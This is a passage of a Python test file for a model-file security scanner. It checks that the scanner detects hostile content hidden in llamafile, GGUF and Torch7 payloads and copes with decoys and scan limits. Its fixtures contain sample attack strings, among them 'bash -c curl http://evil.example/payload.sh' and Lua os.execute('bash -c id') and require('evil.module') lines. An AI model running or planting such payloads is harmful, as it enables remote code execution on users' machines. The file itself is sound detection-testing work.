                ("general.description", "bash -c curl http://evil.example/payload.sh"),
            ]
        ),
    )

    direct = LlamafileScanner(config={"gguf_max_metadata_keys": 1}).scan(str(binary))

    assert direct.success is False
    assert direct.metadata["embedded_payload_offset"] == payload_offset
    assert direct.metadata["embedded_payload_boundary_trusted"] is True
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_GGUF_ANALYSIS_INCOMPLETE_REASON in direct.metadata["scan_outcome_reasons"]
    assert "gguf_metadata_limit_exceeded" in direct.metadata["embedded_gguf_metadata"]["scan_outcome_reasons"]
    resource_checks = [
        check for check in direct.checks if check.name == "Llamafile Embedded GGUF Metadata Resource Limits"
    ]
    assert len(resource_checks) == 1
    assert resource_checks[0].message == "File declares 2 metadata keys, exceeding limit 1"
    assert not any(check.name == "Llamafile Runtime String Analysis" for check in direct.checks)

    aggregate = scan_model_directory_or_file(
        str(binary),
        gguf_max_metadata_keys=1,
        cache_scan_results=False,
    )
    assert aggregate.success is False
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "embedded-gguf-cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            gguf_max_metadata_keys=1,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        assert cached_aggregate.success is False
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_runtime_evidence_retention_is_bounded(monkeypatch: pytest.MonkeyPatch) -> None:
    blob = b"\x00".join(f"curl http://evil-{index:04}.example/payload".encode() for index in range(100))
    redaction_calls = 0
    original_redact = llamafile_scanner_module.redact_evidence_string

    def counting_redact(text: str, max_chars: int | None = 180) -> str:
        nonlocal redaction_calls
        redaction_calls += 1
        return original_redact(text, max_chars=max_chars)

    monkeypatch.setattr(llamafile_scanner_module, "redact_evidence_string", counting_redact)

    (
        command_hits,
        network_hits,
        string_scan_limited,
        candidate_scan_limited,
        transfer_token_scan_limited,
        transfer_option_ambiguous,
        interpreter_token_scan_limited,
        command_attempts,
        network_attempts,
        candidates_scanned,
        correlated_signal_seen,
    ) = LlamafileScanner()._runtime_string_hits(blob)

    assert len(command_hits) == LLAMAFILE_RUNTIME_MAX_EVIDENCE
    assert len(network_hits) == LLAMAFILE_RUNTIME_MAX_EVIDENCE
    assert sorted(command_hits) == sorted(network_hits)
    assert string_scan_limited is False
    assert candidate_scan_limited is False
    assert transfer_token_scan_limited is False
    assert transfer_option_ambiguous is False
    assert interpreter_token_scan_limited is False
    assert command_attempts == LLAMAFILE_RUNTIME_MAX_EVIDENCE
    assert network_attempts == LLAMAFILE_RUNTIME_MAX_EVIDENCE
    assert candidates_scanned == 100
    assert correlated_signal_seen is True
    assert redaction_calls == LLAMAFILE_RUNTIME_MAX_EVIDENCE


def test_llamafile_scanner_marks_omitted_runtime_bytes_inconclusive(tmp_path: Path) -> None:
    binary = tmp_path / "bounded-runtime-preview-gap.llamafile"
    _write_sparse_runtime_gap_llamafile(binary, b"bash -c curl http://evil.example/payload.sh")

    result = LlamafileScanner(config={"llamafile_payload_scan_bytes": 3 * 1024 * 1024}).scan(str(binary))

    assert result.success is False
    assert result.metadata.get("analysis_incomplete") is True
    assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON in result.metadata.get("scan_outcome_reasons", [])
    coverage_checks = [check for check in result.checks if check.name == "Llamafile Runtime Coverage"]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].severity == IssueSeverity.INFO
    assert coverage_checks[0].message == "Executable runtime extends beyond the bounded streaming scan window"
    assert coverage_checks[0].details.get("analysis_incomplete") is True
    assert coverage_checks[0].details.get("runtime_bytes_omitted") == 9 * 1024 * 1024

    aggregate = scan_model_directory_or_file(
        str(binary),
        llamafile_payload_scan_bytes=3 * 1024 * 1024,
        cache_scan_results=False,
    )
    metadata = aggregate.file_metadata[str(binary)]
    assert aggregate.success is False
    assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON in metadata.get("scan_outcome_reasons", [])
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "runtime-coverage-cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            llamafile_payload_scan_bytes=3 * 1024 * 1024,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        cached_metadata = cached_aggregate.file_metadata[str(binary)]
        assert cached_aggregate.success is False
        assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON in cached_metadata.get("scan_outcome_reasons", [])
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_scanner_does_not_route_middle_near_match_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "middle-near-match.exe"
    binary.write_bytes(
        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"llama-file runtime" + b"B" * (2 * 1024 * 1024 + 64)
    )

    assert not LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_does_not_scan_past_route_budget(tmp_path: Path) -> None:
    binary = tmp_path / "late-marker.exe"
    binary.write_bytes(
        b"MZ"
        + b"\x00" * 62
        + b"A" * LLAMAFILE_ROUTE_SCAN_BYTES
        + b"llamafile runtime"
        + b"B" * LLAMAFILE_ROUTE_TAIL_SCAN_BYTES
    )

    assert not LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_tail_only_marker_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "tail-marker.exe"
    binary.write_bytes(b"MZ" + b"\x00" * 62 + b"A" * (LLAMAFILE_ROUTE_SCAN_BYTES + 64) + b"llamafile runtime")

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_benign_sample_has_no_high_severity(tmp_path: Path) -> None:
    binary = tmp_path / "safe.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    result = LlamafileScanner().scan(str(binary))

    high_severity = [
        issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert high_severity == []
    assert result.metadata.get("embedded_payload_offset") is not None


def test_llamafile_torch7_polyglot_preserves_outer_integrity_metadata(tmp_path: Path) -> None:
    binary = tmp_path / "embedded-torch7.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            embedded_payload=b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n",
        )
    )
    expected_size = binary.stat().st_size
    expected_sha256 = hashlib.sha256(binary.read_bytes()).hexdigest()

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["file_size"] == expected_size
    assert result.metadata["file_hashes"]["sha256"] == expected_sha256


def test_llamafile_detects_appended_torch7_after_valid_gguf_payload(tmp_path: Path) -> None:
    binary = tmp_path / "valid-gguf-then-torch7.llamafile"
    valid_gguf = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=valid_gguf + (b"\x00" * 1024) + torch7_payload))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["embedded_payload_offset"] < result.metadata["embedded_torch7_offset"]
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_skips_bare_torch7_decoy_before_appended_payload(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-decoy-then-payload.llamafile"
    valid_gguf = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
    embedded_payload = valid_gguf + b"T7\x00\x00" + (b"A" * 8192) + torch7_payload
    binary.write_bytes(_build_llamafile_blob(embedded_payload=embedded_payload))

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_bounds_torch7_scan_attempts_after_marker_decoys(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "many-torch7-marker-decoys.llamafile"
    valid_gguf = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    decoys = b"".join(b"T7\x00\x00" + (b"A" * 32) for _ in range(256))
    torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=valid_gguf + decoys + torch7_payload))

    scanned_offsets: list[int] = []
    original_scan_candidate = LlamafileScanner._scan_embedded_torch7_candidate

    def counting_scan_candidate(
        self: LlamafileScanner,
        path: Path,
        scanner: Any,
        result: ScanResult,
        offset: int,
    ) -> tuple[ScanResult | None, int]:
        scanned_offsets.append(offset)
        return original_scan_candidate(self, path, scanner, result, offset)

    monkeypatch.setattr(LlamafileScanner, "_scan_embedded_torch7_candidate", counting_scan_candidate)

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    assert scanned_offsets == [binary.read_bytes().index(torch7_payload)]
    assert result.metadata["embedded_torch7_offset"] == scanned_offsets[0]
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_finds_torch7_in_initial_payload_pass_while_skipping_marker_decoys(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "many-torch7-marker-decoys-single-pass.llamafile"
    valid_gguf = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    decoys = b"".join(b"T7\x00\x00" + (b"A" * 32) for _ in range(128))
    torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=valid_gguf + decoys + torch7_payload))

    find_start_offsets: list[int] = []
    original_find_offset = LlamafileScanner._find_embedded_torch7_offset

    def counting_find_offset(path: Path, max_scan_bytes: int, *, start_offset: int = 0) -> int | None:
        find_start_offsets.append(start_offset)
        return original_find_offset(path, max_scan_bytes, start_offset=start_offset)

    monkeypatch.setattr(LlamafileScanner, "_find_embedded_torch7_offset", staticmethod(counting_find_offset))

    signal_probe_offsets: list[int] = []
    original_signal_rank = LlamafileScanner._embedded_torch7_candidate_actionable_signal_rank

    def counting_signal_rank(path: Path, offset: int, max_scan_bytes: int, *, stop_at_any_marker: bool = False) -> int:
        signal_probe_offsets.append(offset)
        return original_signal_rank(path, offset, max_scan_bytes, stop_at_any_marker=stop_at_any_marker)

    monkeypatch.setattr(
        LlamafileScanner,
        "_embedded_torch7_candidate_actionable_signal_rank",
        classmethod(
            lambda cls, path, offset, max_scan_bytes, *, stop_at_any_marker=False: counting_signal_rank(
                path,
                offset,
                max_scan_bytes,
                stop_at_any_marker=stop_at_any_marker,
            )
        ),
    )

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    assert find_start_offsets == []
    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_continues_after_structural_torch7_decoy(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-structural-decoy-then-payload.llamafile"
    valid_gguf = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    structural_decoy = b"T7\x00\x00torch.FloatTensor tensor placeholder\n"
    torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
    embedded_payload = valid_gguf + structural_decoy + (b"A" * 8192) + torch7_payload
    binary.write_bytes(_build_llamafile_blob(embedded_payload=embedded_payload))

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_preserves_later_same_severity_distinct_torch7_findings(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-two-warning-candidates.llamafile"
    dynamic_load_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\npackage.loadlib('libx.so', 'luaopen_x')\n"
    exec_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=dynamic_load_payload + (b"A" * 8192) + exec_payload))

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    failed_warning_checks = {
        check.name
        for check in result.checks
        if check.status == CheckStatus.FAILED and check.severity == IssueSeverity.WARNING
    }
    assert "Torch7 Dynamic Module Load Analysis" in failed_warning_checks
    assert "Torch7 Lua Execution Primitive Analysis" in failed_warning_checks
    assert [candidate["offset"] for candidate in result.metadata["embedded_torch7_candidates"]] == [
        binary.read_bytes().index(dynamic_load_payload),
        binary.read_bytes().index(exec_payload),
    ]


def test_llamafile_preserves_same_signal_torch7_candidates_with_distinct_evidence(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-two-exec-candidates.llamafile"
    first_exec_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
    second_exec_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('whoami')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=first_exec_payload + (b"A" * 8192) + second_exec_payload))

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    assert [candidate["offset"] for candidate in result.metadata["embedded_torch7_candidates"]] == [
        binary.read_bytes().index(first_exec_payload),
        binary.read_bytes().index(second_exec_payload),
    ]
    failed_examples = [
        example
        for check in result.checks
        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
        for example in check.details["examples"]
    ]
    assert any("os.execute('id')" in example for example in failed_examples)
    assert any("os.execute('whoami')" in example for example in failed_examples)


def test_llamafile_prefers_later_critical_torch7_candidate_over_warning_decoy(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-warning-decoy-then-critical.llamafile"
    warning_decoy = b"T7\x00\x00torch.FloatTensor nn.Sequential\npackage.loadlib('libx.so', 'luaopen_x')\n"
    critical_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('bash -c id')\n"
    embedded_payload = warning_decoy + (b"A" * 8192) + critical_payload
    binary.write_bytes(_build_llamafile_blob(embedded_payload=embedded_payload))

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(critical_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_llamafile_bounds_actionable_candidate_scans_but_keeps_higher_severity(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "torch7-many-actionable-decoys-then-critical.llamafile"
    warning_candidates = [
        f"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id-{index}')\n".encode() + (b"A" * 256)
        for index in range(8)
    ]
    critical_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('bash -c id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"".join(warning_candidates) + critical_payload))

    scanned_offsets: list[int] = []
    original_scan_candidate = LlamafileScanner._scan_embedded_torch7_candidate

    def counting_scan_candidate(
        self: LlamafileScanner,
        path: Path,
        scanner: Any,
        result: ScanResult,
        offset: int,
    ) -> tuple[ScanResult | None, int]:
        scanned_offsets.append(offset)
        return original_scan_candidate(self, path, scanner, result, offset)

    monkeypatch.setattr(LlamafileScanner, "_scan_embedded_torch7_candidate", counting_scan_candidate)

    result = LlamafileScanner(config={"llamafile_torch7_max_candidate_scans": 2, "torch7_max_scan_bytes": 128}).scan(
        str(binary)
    )

    critical_offset = binary.read_bytes().index(critical_payload)
    assert scanned_offsets == [
        binary.read_bytes().index(warning_candidates[0]),
        binary.read_bytes().index(warning_candidates[1]),
        critical_offset,
    ]
    assert result.metadata["embedded_torch7_candidate_scan_limited"] is True
    assert result.metadata["embedded_torch7_actionable_candidate_scans"] == 3
    assert result.metadata["embedded_torch7_offset"] == critical_offset
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_llamafile_ranks_split_critical_signal_before_actionable_cap(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-split-critical-signal-after-warning-cap.llamafile"
    warning_candidates = [
        f"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id-{index}')\n".encode() + (b"A" * (130 * 1024))
        for index in range(4)
    ]
    critical_prefix = b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
    shell_signal = b"\x00bash -c\n"
    first_chunk_padding = b"A" * (64 * 1024 - len(critical_prefix) - len(shell_signal) - 256)
    critical_payload = (
        critical_prefix + first_chunk_padding + shell_signal + (b"\x00" * 256) + b"cmd = os.execute('id')\n"
    )
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"".join(warning_candidates) + critical_payload))

    result = LlamafileScanner(
        config={"llamafile_torch7_max_candidate_scans": 2, "torch7_max_scan_bytes": 128 * 1024}
    ).scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(critical_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_llamafile_does_not_rank_unrelated_shell_string_as_critical_cap_signal(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "torch7-unrelated-shell-decoys-then-critical.llamafile"
    warning_candidates = [
        (
            f"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id-{index}')\n".encode()
            + b"\x00".join(f"benign-{filler}".encode() for filler in range(8))
            + b"\x00bash -c\n"
            + b"\x00"
            + (b"P" * 512)
        )
        for index in range(4)
    ]
    critical_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('bash -c id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"".join(warning_candidates) + critical_payload))

    scanned_offsets: list[int] = []
    original_scan_candidate = LlamafileScanner._scan_embedded_torch7_candidate

    def counting_scan_candidate(
        self: LlamafileScanner,
        path: Path,
        scanner: Any,
        result: ScanResult,
        offset: int,
    ) -> tuple[ScanResult | None, int]:
        scanned_offsets.append(offset)
        return original_scan_candidate(self, path, scanner, result, offset)

    monkeypatch.setattr(LlamafileScanner, "_scan_embedded_torch7_candidate", counting_scan_candidate)

    result = LlamafileScanner(config={"llamafile_torch7_max_candidate_scans": 2, "torch7_max_scan_bytes": 512}).scan(
        str(binary)
    )

    critical_offset = binary.read_bytes().index(critical_payload)
    assert scanned_offsets == [
        binary.read_bytes().index(warning_candidates[0]),
        binary.read_bytes().index(warning_candidates[1]),
        critical_offset,
    ]
    assert result.metadata["embedded_torch7_offset"] == critical_offset
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_llamafile_keeps_searching_after_non_actionable_candidate_cap(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-many-benign-candidates-then-payload.llamafile"
    benign_candidates = b"".join(b"T7\x00\x00" + (b"A" * 64) for _ in range(32))
    torch7_payload = b"T7\x00\x00" + (b"A" * (80 * 1024)) + b"cmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=benign_candidates + torch7_payload))

    result = LlamafileScanner(
        config={"llamafile_torch7_max_candidate_scans": 4, "torch7_max_scan_bytes": 128 * 1024}
    ).scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_binary_torch7_internal_marker_survives_non_actionable_cap(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-internal-marker-after-binary-decoys.llamafile"
    binary_decoys = [b"T7\x00\x00\x01\x02\x03\x04benign serialized bytes\n" + (b"A" * 8192) for _ in range(4)]
    torch7_payload = b"T7\x00\x00\x01\x02\x03\x04T7\x00\x00serialized record bytes\ncmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"".join(binary_decoys) + torch7_payload))

    result = LlamafileScanner(config={"llamafile_torch7_max_candidate_scans": 2, "torch7_max_scan_bytes": 4096}).scan(
        str(binary)
    )

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_keeps_searching_after_cap_for_require_only_torch7_payload(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-many-benign-candidates-then-require-payload.llamafile"
    benign_candidates = b"".join(b"T7\x00\x00torch.FloatTensor tensor placeholder\n" for _ in range(8))
    torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\nrequire('evil.module')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=benign_candidates + torch7_payload))

    result = LlamafileScanner(config={"llamafile_torch7_max_candidate_scans": 4, "torch7_max_scan_bytes": 128}).scan(
        str(binary)
    )

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Dynamic Module Load Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_safe_require_decoys_do_not_exhaust_actionable_candidate_budget(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-safe-require-decoys-then-evil-require.llamafile"
    safe_decoys = [b"T7\x00\x00\x01\x02\x03\x04require('torch')\n" + (b"A" * 256) for _ in range(4)]
    torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\nrequire('evil.module')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"".join(safe_decoys) + torch7_payload))

    result = LlamafileScanner(config={"llamafile_torch7_max_candidate_scans": 2, "torch7_max_scan_bytes": 128}).scan(
        str(binary)
    )

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Dynamic Module Load Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_torch7_iterator_skips_marker_decoy_before_actionable_candidate(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-signal-after-next-marker.llamafile"
    first_candidate = b"T7\x00\x00" + (b"A" * 64)
    second_candidate = b"T7\x00\x00" + (b"A" * (80 * 1024)) + b"cmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=first_candidate + second_candidate))

    first_offset = binary.read_bytes().index(first_candidate)
    second_offset = binary.read_bytes().index(second_candidate)

    assert list(LlamafileScanner._iter_embedded_torch7_offsets(binary, 128 * 1024, start_offset=first_offset)) == [
        second_offset
    ]


def test_llamafile_ignores_benign_torch7_magic_only_marker(tmp_path: Path) -> None:
    binary = tmp_path / "benign-torch7-marker-only.llamafile"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"T7\x00\x00" + (b"A" * 8192)))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
    assert "embedded_torch7_offset" not in result.metadata
    assert not any(check.name.startswith("Torch7 ") for check in result.checks)


def test_llamafile_ignores_benign_binary_torch7_magic_only_marker(tmp_path: Path) -> None:
    binary = tmp_path / "benign-binary-torch7-marker-only.llamafile"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"T7\x00\x00" + (b"\x00\x01\x02\x03" * 8192)))

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
    assert "embedded_torch7_offset" not in result.metadata
    assert not any(check.name.startswith("Torch7 ") for check in result.checks)


def test_llamafile_preserves_magic_only_binary_torch7_payload(tmp_path: Path) -> None:
    binary = tmp_path / "magic-only-binary-torch7.llamafile"
    torch7_payload = b"T7\x00\x00" + (b"\x01\x02\x03\x04" * 1024) + b"cmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=torch7_payload))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_preserves_magic_only_binary_torch7_payload_with_late_lua_signal(tmp_path: Path) -> None:
    binary = tmp_path / "late-magic-only-binary-torch7.llamafile"
    binary_records = b"\x01\x02\x03\x04" * (20 * 1024)
    torch7_payload = b"T7\x00\x00" + binary_records + b"cmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=torch7_payload))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_preserves_printable_magic_only_torch7_payload_with_late_lua_signal(tmp_path: Path) -> None:
    binary = tmp_path / "late-printable-magic-only-torch7.llamafile"
    torch7_payload = b"T7\x00\x00" + (b"A" * (2 * 1024 * 1024)) + b"cmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=torch7_payload))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_detects_torch7_header_cut_by_embedded_gguf_marker(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-header-with-embedded-gguf-marker.llamafile"
    torch7_payload = b"T7\x00\x00GGUFserialized bytes\ncmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=torch7_payload))

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 4096}).scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_ignores_many_invalid_ascii_torch7_header_decoys(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "many-ascii-torch7-decoys.llamafile"
    invalid_ascii_decoys = b"".join(b"4\nnot-an-index\n" for _ in range(4096))
    torch7_payload = b"4\n1\n3\nV 1\n13\nnn.Sequential\ncmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=invalid_ascii_decoys + torch7_payload))

    scanned_offsets: list[int] = []
    structural_probes = 0
    original_scan_candidate = LlamafileScanner._scan_embedded_torch7_candidate
    original_structural_probe = find_structural_torch7_offset

    def counting_scan_candidate(
        self: LlamafileScanner,
        path: Path,
        scanner: Any,
        result: ScanResult,
        offset: int,
    ) -> tuple[ScanResult | None, int]:
        scanned_offsets.append(offset)
        return original_scan_candidate(self, path, scanner, result, offset)

    def counting_structural_probe(payload: bytes) -> int | None:
        nonlocal structural_probes
        structural_probes += 1
        return original_structural_probe(payload)

    monkeypatch.setattr(LlamafileScanner, "_scan_embedded_torch7_candidate", counting_scan_candidate)
    monkeypatch.setattr(
        "modelaudit.scanners.llamafile_scanner.find_structural_torch7_offset", counting_structural_probe
    )

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 256}).scan(str(binary))

    assert scanned_offsets == [binary.read_bytes().index(torch7_payload)]
    assert structural_probes <= 4
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_ignores_truncated_embedded_torch7_marker(tmp_path: Path) -> None:
    binary = tmp_path / "truncated-torch7-marker.llamafile"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"T7\x00\x00"))

    result = LlamafileScanner().scan(str(binary))

    assert result.success is True
    assert "embedded_torch7_offset" not in result.metadata
    assert not any(check.name.startswith("Torch7 ") for check in result.checks)


def test_llamafile_runtime_preview_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "unavailable-preview.llamafile"
